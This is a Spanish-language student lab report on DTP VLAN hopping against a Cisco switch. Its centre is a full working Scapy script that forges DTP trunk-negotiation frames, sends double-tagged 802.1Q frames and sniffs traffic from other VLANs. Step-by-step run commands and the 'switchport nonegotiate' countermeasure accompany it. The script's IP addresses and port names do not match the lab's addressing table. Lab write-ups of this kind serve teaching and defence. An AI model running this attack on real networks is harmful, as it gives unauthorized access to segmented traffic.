 
# Ataque DTP VLAN Hopping: Convierta una interfaz de acceso en una interfaz troncal

**Nombre:** Henry Vicente Quezada | **Matrícula:** 2025-1332 | **Fecha:** 12 de Junio 2026

---

## 🎬 Video Demostrativo

https://youtu.be/esD23vzgmas 

---

## 1. Objetivo del Laboratorio

Demostrar cómo el protocolo DTP (Dynamic Trunking Protocol) puede ser explotado para negociar un enlace trunk con un switch Cisco desde un dispositivo no autorizado conectado a un puerto en modo `dynamic auto`/`dynamic desirable`, obteniendo acceso a tráfico etiquetado 802.1Q de VLANs distintas a la asignada (VLAN Hopping), y documentar la contramedida correspondiente (`switchport nonegotiate`).

---

## 2. Objetivo del Script

Enviar frames DTP "Desirable, 802.1Q" hacia el switch víctima para forzar la negociación de un enlace trunk en el puerto del atacante, y opcionalmente realizar double tagging para alcanzar tráfico de una VLAN distinta a la propia.

### 2.1 Parámetros Usados

| Parámetro         | Descripción                                  | Valor por defecto |
| ----------------- | --------------------------------------------- | ------------------ |
| `-i`, `--iface`   | Interfaz de red del atacante                   | `eth0`              |
| `-n`, `--count`   | Número de frames DTP a enviar                  | 5                   |
| `-t`, `--intervalo` | Intervalo entre frames DTP (segundos)        | 1.0                 |
| `--dst-ip`        | IP destino para la fase de double tagging      | `10.11.85.10`       |
| `--solo-dtp`      | Ejecuta solo la fase de negociación DTP        | —                   |
| `--solo-sniff`    | Ejecuta solo la fase de captura de tráfico     | —                   |
| `--sniff-timeout` | Segundos de captura en la fase de sniff        | 15                  |

### 2.2 Requisitos

- Sistema operativo: **Kali Linux**
- Python 3.x
- Librería Scapy: `pip install scapy`
- Permisos de root: `sudo`
- Puerto del switch conectado al atacante en modo `dynamic auto` o `dynamic desirable` (con `Negotiation of Trunking: On`)

---

## 3. Funcionamiento del Script

1. Verifica privilegios root y disponibilidad de Scapy.
2. Obtiene la MAC de la interfaz del atacante.
3. Construye un frame Ethernet 802.3 + LLC + SNAP con TLVs DTP (`Domain`, `Status=Desirable`, `DTP Type=802.1Q`, `Neighbor=MAC`).
4. Envía N frames DTP al multicast `01:00:0c:cc:cc:cc` para forzar la negociación de trunk.
5. (Opcional) Envía frames con doble etiqueta 802.1Q (`Dot1Q` exterior = VLAN nativa, `Dot1Q` interior = VLAN objetivo) hacia una IP destino.
6. (Opcional) Captura tráfico etiquetado (`Dot1Q`) en la interfaz para verificar acceso a otras VLANs.
7. Limpia subinterfaces creadas durante la prueba.

---

## 4. Pasos de Ejecución

```
import os
import sys
import time
import argparse
 
# Verificar root antes de importar scapy
if os.geteuid() != 0:
    print("[!] Este script requiere privilegios root.")
    print("    Ejecuta: sudo python3 dtp_vlan_hopping.py")
    sys.exit(1)
 
try:
    from scapy.all import (
        Ether, Dot1Q, LLC, SNAP, IP, ICMP,
        get_if_hwaddr, sendp, sniff, conf
    )
except ImportError:
    print("[!] Scapy no está instalado.")
    print("    Ejecuta: pip install scapy")
    sys.exit(1)
 
 
# ─────────────────────────────────────────────
#  CONFIGURACIÓN DEL LABORATORIO
# ─────────────────────────────────────────────
DEFAULT_IFACE  = "eth0"
DTP_MULTICAST  = "01:00:0c:cc:cc:cc"   # MAC multicast Cisco DTP
VLAN_NATIVA    = 10                     # VLAN del puerto de acceso del atacante
VLAN_OBJETIVO  = 20                     # VLAN destino (salto)
IP_ATACANTE    = "10.11.85.50"
IP_SERVIDOR    = "10.11.85.10"          # Objetivo en VLAN 20
 
 
# ─────────────────────────────────────────────
#  FASE 1: CONSTRUCCIÓN DEL FRAME DTP
# ─────────────────────────────────────────────
def build_dtp_negotiate(iface: str) -> bytes:
    """
    Construye un frame DTP con TLVs que indican 'desirable trunk'.
    El switch en modo 'dynamic desirable' acepta la negociación y
    convierte el puerto a modo trunk.
 
    Estructura del frame:
        Ethernet (Dot3) → LLC → SNAP → DTP TLVs
    """
    src_mac = get_if_hwaddr(iface)
 
    # Encabezado Ethernet 802.3 con longitud
    eth = Ether(dst=DTP_MULTICAST, src=src_mac, type=0x002a)
 
    # LLC (Logical Link Control) — SNAP frame
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
 
    # SNAP: OUI Cisco + código de protocolo DTP
    snap = SNAP(OUI=0x00000c, code=0x2004)
 
    # TLVs DTP construidos manualmente:
    #   Tipo 0x0001 = Domain  → dominio vacío
    #   Tipo 0x0002 = Status  → 0x03 (desirable)
    #   Tipo 0x0003 = DTP Type → 0xa5 (802.1Q)
    #   Tipo 0x0004 = Neighbor → MAC del atacante
 
    mac_bytes = bytes.fromhex(src_mac.replace(":", ""))
 
    dtp_payload = (
        b'\x01'                    # Versión DTP = 1
        # TLV Domain
        b'\x00\x01'                # Tipo: Domain
        b'\x00\x05'                # Longitud: 5 bytes (2+2+1)
        b'\x00'                    # Dominio vacío (1 byte)
        # TLV Status
        b'\x00\x02'                # Tipo: Status
        b'\x00\x05'                # Longitud: 5
        b'\x03'                    # Valor: 0x03 = Desirable
        # TLV DTP Type (encapsulación)
        b'\x00\x03'                # Tipo: DTP Type
        b'\x00\x05'                # Longitud: 5
        b'\xa5'                    # Valor: 0xa5 = 802.1Q
        # TLV Neighbor (MAC del atacante)
        b'\x00\x04'                # Tipo: Neighbor
        b'\x00\x0a'                # Longitud: 10 (2+2+6)
        + mac_bytes                # MAC origen
    )
 
    # Ensamblar frame completo con payload raw
    frame = eth / llc / snap / dtp_payload
    return frame
 
 
# ─────────────────────────────────────────────
#  FASE 2: ENVÍO DE FRAMES DTP
# ─────────────────────────────────────────────
def fase_dtp_negotiate(iface: str, count: int = 5, intervalo: float = 1.0):
    """
    Envía múltiples frames DTP negotiate para forzar
    al switch a convertir el puerto a modo trunk.
    """
    print("\n" + "="*60)
    print("  FASE 1: DTP Negotiate — Puerto acceso → Trunk")
    print("="*60)
    print(f"  Interfaz  : {iface}")
    print(f"  MAC origen: {get_if_hwaddr(iface)}")
    print(f"  Destino   : {DTP_MULTICAST} (Cisco DTP multicast)")
    print(f"  Frames    : {count}  |  Intervalo: {intervalo}s")
    print("-"*60)
 
    frame = build_dtp_negotiate(iface)
 
    for i in range(1, count + 1):
        sendp(frame, iface=iface, verbose=False)
        print(f"  [{i:02d}/{count}] Frame DTP enviado — Status=Desirable, Type=802.1Q")
        time.sleep(intervalo)
 
    print("-"*60)
    print("  [OK] Frames enviados.")
    print("  [*]  Verifica en el switch:")
    print("       show interfaces FastEthernet0/1 trunk")
    print("       show interfaces FastEthernet0/1 switchport")
 
 
# ─────────────────────────────────────────────
#  FASE 3: DOUBLE TAGGING (salto a VLAN objetivo)
# ─────────────────────────────────────────────
def build_double_tag_frame(iface: str, dst_ip: str) -> bytes:
    """
    Construye un frame con doble etiqueta 802.1Q:
      - Outer tag = VLAN nativa (será removida por SW1)
      - Inner tag = VLAN objetivo (llega a SW2 → VLAN 20)
 
    Esto permite al atacante llegar a VLANs a las que
    normalmente no tiene acceso.
    """
    frame = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(iface))
        / Dot1Q(vlan=VLAN_NATIVA, type=0x8100)   # Outer tag — VLAN nativa
        / Dot1Q(vlan=VLAN_OBJETIVO)               # Inner tag — VLAN destino
        / IP(src=IP_ATACANTE, dst=dst_ip)
        / ICMP()
    )
    return frame
 
 
def fase_double_tagging(iface: str, dst_ip: str, count: int = 3):
    """
    Envía frames con doble etiqueta hacia la VLAN objetivo.
    Solo funciona si FASE 1 (trunk) tuvo éxito.
    """
    print("\n" + "="*60)
    print("  FASE 2: Double Tagging — Salto a VLAN objetivo")
    print("="*60)
    print(f"  VLAN nativa  : {VLAN_NATIVA}  (outer tag — removida por SW1)")
    print(f"  VLAN objetivo: {VLAN_OBJETIVO} (inner tag — llega a SW2)")
    print(f"  IP destino   : {dst_ip}")
    print("-"*60)
 
    frame = build_double_tag_frame(iface, dst_ip)
 
    for i in range(1, count + 1):
        sendp(frame, iface=iface, verbose=False)
        print(f"  [{i:02d}/{count}] Frame doble-etiqueta enviado → {dst_ip}")
        time.sleep(0.5)
 
    print("-"*60)
    print("  [OK] Si el switch es vulnerable, el frame llegó a VLAN 20.")
    print("  [*]  Captura con: tcpdump -i eth0 -n vlan")
 
 
# ─────────────────────────────────────────────
#  ESCUCHA: CAPTURA TRÁFICO DE OTRAS VLANs
# ─────────────────────────────────────────────
def fase_sniff(iface: str, timeout: int = 15):
    """
    Una vez que el puerto es trunk, captura tráfico etiquetado
    de todas las VLANs que pasan por el enlace.
    """
    print("\n" + "="*60)
    print("  FASE 3: Captura de tráfico inter-VLAN")
    print("="*60)
    print(f"  Escuchando en {iface} por {timeout} segundos...")
    print("  (Ctrl+C para detener antes)")
    print("-"*60)
 
    capturados = []
 
    def procesar(pkt):
        if pkt.haslayer(Dot1Q):
            vlan_id = pkt[Dot1Q].vlan
            src_mac = pkt[Ether].src
            print(f"  [CAPTURA] VLAN={vlan_id:4d}  src={src_mac}  "
                  f"len={len(pkt)} bytes")
            capturados.append(pkt)
 
    try:
        sniff(iface=iface, prn=procesar, timeout=timeout, store=False)
    except KeyboardInterrupt:
        pass
 
    print("-"*60)
    print(f"  [OK] Capturados {len(capturados)} frames etiquetados.")
 
 
# ─────────────────────────────────────────────
#  LIMPIEZA: Restaurar interfaz
# ─────────────────────────────────────────────
def cleanup(iface: str):
    """Elimina subinterfaces 802.1Q creadas durante el lab."""
    print("\n[*] Limpiando configuración de subinterfaces...")
    for vlan in [VLAN_NATIVA, VLAN_OBJETIVO]:
        os.system(f"ip link delete {iface}.{vlan} 2>/dev/null")
    print("[OK] Limpieza completada.")
 
 
# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║   DTP VLAN Hopping                                           ║
╚══════════════════════════════════════════════════════════════╝
""")
 
 
def main():
    banner()
 
    parser = argparse.ArgumentParser(
        description="Lab educativo: DTP VLAN Hopping"
    )
    parser.add_argument("-i", "--iface",    default=DEFAULT_IFACE,
                        help=f"Interfaz de red (default: {DEFAULT_IFACE})")
    parser.add_argument("-n", "--count",    type=int, default=5,
                        help="Número de frames DTP a enviar (default: 5)")
    parser.add_argument("-t", "--intervalo",type=float, default=1.0,
                        help="Intervalo entre frames DTP en segundos (default: 1.0)")
    parser.add_argument("--dst-ip",         default=IP_SERVIDOR,
                        help=f"IP destino para double tagging (default: {IP_SERVIDOR})")
    parser.add_argument("--solo-dtp",       action="store_true",
                        help="Ejecutar solo la fase DTP negotiate")
    parser.add_argument("--solo-sniff",     action="store_true",
                        help="Ejecutar solo captura de tráfico")
    parser.add_argument("--sniff-timeout",  type=int, default=15,
                        help="Segundos de captura (default: 15)")
 
    args = parser.parse_args()
 
    print(f"[*] Iniciando laboratorio en interfaz: {args.iface}")
    print(f"[*] VLAN nativa: {VLAN_NATIVA}  |  VLAN objetivo: {VLAN_OBJETIVO}")
 
    try:
        if args.solo_sniff:
            fase_sniff(args.iface, args.sniff_timeout)
 
        elif args.solo_dtp:
            fase_dtp_negotiate(args.iface, args.count, args.intervalo)
 
        else:
            # Secuencia completa del ataque
            fase_dtp_negotiate(args.iface, args.count, args.intervalo)
 
            print("\n[*] Esperando 3 segundos para que el trunk se establezca...")
            time.sleep(3)
 
            fase_double_tagging(args.iface, args.dst_ip)
 
            time.sleep(1)
 
            fase_sniff(args.iface, args.sniff_timeout)
 
    except KeyboardInterrupt:
        print("\n\n[!] Interrumpido por el usuario.")
 
    finally:
        cleanup(args.iface)
 
    print("\n" + "="*60)
   
 
 
if __name__ == "__main__":
    main()
```

### Preparación

```bash
nano /home/kali-linux/HenryVicenteQuezada_2025-1332_dtp_hopping.py
chmod +x /home/kali-linux/HenryVicenteQuezada_2025-1332_dtp_hopping.py
```

### Paso 1 — SW1: Ver estado del puerto antes del ataque
```bash
show interfaces e0/3 switchport
```
Esperado: `Administrative Mode: dynamic auto`, `Negotiation of Trunking: On`, `Operational Mode: static access`.

### Paso 2 — Kali: Captura inicial (sin trunk)
```bash
sudo tcpdump -i eth0 -n vlan -c 5
```
No debe capturar tráfico etiquetado.

### Paso 3 — Kali: Ejecutar el ataque DTP
```bash
sudo python3 HenryVicenteQuezada_2025-1332_dtp_hopping.py -i eth0 --solo-dtp -n 10 -t 0.5
```

### Paso 4 — SW1: Verificar que el puerto negoció trunk
```bash
show interfaces e0/3 switchport
show interfaces e0/3 trunk
```
Esperado: `Operational Mode: trunk`, `Operational Trunking Encapsulation: dot1q`.

### Paso 5 — Kali: Verificar acceso a tráfico de otras VLANs
```bash
sudo tcpdump -i eth0 -n vlan -c 10
```
Esperado: frames con `vlan 10`, `vlan 20`, `vlan 99` visibles — VLAN Hopping exitoso.

### Paso 6 — SW1: Aplicar contramedida
```bash
conf t
interface e0/3
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
exit
interface e0/2
 switchport mode access
 switchport nonegotiate
exit
interface e0/1
 switchport mode access
 switchport nonegotiate
exit
end
write memory
```

### Paso 7 — Kali: Limpiar subinterfaces creadas
```bash
sudo ip link delete eth0.10 2>/dev/null
sudo ip link delete eth0.20 2>/dev/null
```

### Paso 8 — Kali: Ejecutar el ataque de nuevo
```bash
sudo python3 HenryVicenteQuezada_2025-1332_dtp_hopping.py -i eth0 --solo-dtp -n 10
```

### Paso 9 — SW1: Verificar que el ataque fue bloqueado
```bash
show interfaces e0/3 switchport
show interfaces e0/3 trunk
show dtp interface e0/3
```
Esperado: `Negotiation of Trunking: Off`, `Operational Mode: static access` — sin trunk, sin hopping posible.

---

## 5. Documentación de la Red

### Topología

<img width="896" height="698" alt="image" src="https://github.com/user-attachments/assets/1336a7af-08ce-4d70-b5bf-2a2cde722c8a" />


### Tabla de Direccionamiento

| Dispositivo | Interfaz | VLAN | IP          | Máscara | Rol                       |
| ----------- | -------- | ---- | ----------- | ------- | ------------------------- |
| R1          | e0/0.10  | 10   | 10.13.32.1  | /24     | Gateway VLAN10 TI         |
| R1          | e0/0.20  | 20   | 10.13.33.1  | /24     | Gateway VLAN20 Gerencia   |
| R1          | e0/0.99  | 99   | 10.13.99.1  | /24     | Gateway Management        |
| SW1         | vlan 99  | 99   | 10.13.99.2  | /24     | VTP Server                |
| SW2         | vlan 99  | 99   | 10.13.99.3  | /24     | VTP Client                |
| VPC10       | eth0     | 10   | 10.13.32.21 | /24     | Cliente VLAN10            |
| VPC20       | eth0     | 20   | 10.13.33.21 | /24     | Cliente VLAN20            |
| Kali        | eth0     | 10   | 10.13.32.5  | /24     | **Atacante**               |

### VLANs

| VLAN | Nombre     | Descripción                     |
| ---- | ---------- | -------------------------------- |
| 10   | TI         | Red de usuarios TI               |
| 20   | Gerencia   | Red de Gerencia                  |
| 99   | Management | Red de gestión de dispositivos   |

### Interfaces SW1

| Puerto | Modo               | VLAN     | Conectado a    |
| ------ | ------------------ | -------- | -------------- |
| e0/0   | Trunk 802.1q       | 10,20,99 | R1 e0/0        |
| e0/1   | Access             | 10       | VPC10          |
| e0/2   | Access             | 20       | VPC20          |
| e0/3   | dynamic auto       | 10       | **Kali Linux** |

---

## 6. Capturas de Pantalla

| Etapa | Captura |
| ----- | ------- |
| Antes del ataque — `show interfaces e0/3 switchport` (static access) |<img width="485" height="400" alt="image" src="https://github.com/user-attachments/assets/33103cdc-3b16-4e5d-9439-879dea50f46d" />|
| Script en ejecución — frames DTP enviados |  
| Durante el ataque — `show interfaces e0/3 trunk` (Operational Mode: trunk) | <img width="561" height="455" alt="image" src="https://github.com/user-attachments/assets/aa63b427-3670-4f64-a968-df4f397f5d05" />|
| Captura tcpdump con tráfico VLAN 10/20/99 | <img width="493" height="403" alt="image" src="https://github.com/user-attachments/assets/fc1808b6-22a4-4635-86fc-beb7698d652d" />|
| Contramedida aplicada — `Negotiation of Trunking: Off` | <img width="493" height="409" alt="image" src="https://github.com/user-attachments/assets/1b7d5a0a-abb3-41a5-b807-1a0a1f03a3bd" />|

---

## 7. Contramedida

```bash
SW1(config)# interface e0/1
SW1(config-if)# switchport mode access
SW1(config-if)# switchport nonegotiate
exit

SW1(config)# interface e0/2
SW1(config-if)# switchport mode access
SW1(config-if)# switchport nonegotiate
exit

SW1(config)# interface e0/3
SW1(config-if)# switchport mode access
SW1(config-if)# switchport access vlan 10
SW1(config-if)# switchport nonegotiate
exit

SW1(config)# end
SW1# write memory

! Verificación
SW1# show interfaces e0/3 switchport
SW1# show interfaces e0/3 trunk
SW1# show dtp interface e0/3
```

**Explicación:** `switchport nonegotiate` deshabilita el envío y respuesta de tramas DTP en el puerto. Aunque el modo administrativo siga siendo `access`, el switch ya no participa en negociaciones DTP, por lo que ningún dispositivo externo puede forzar la conversión del puerto a trunk, eliminando el vector de VLAN Hopping vía DTP.

---
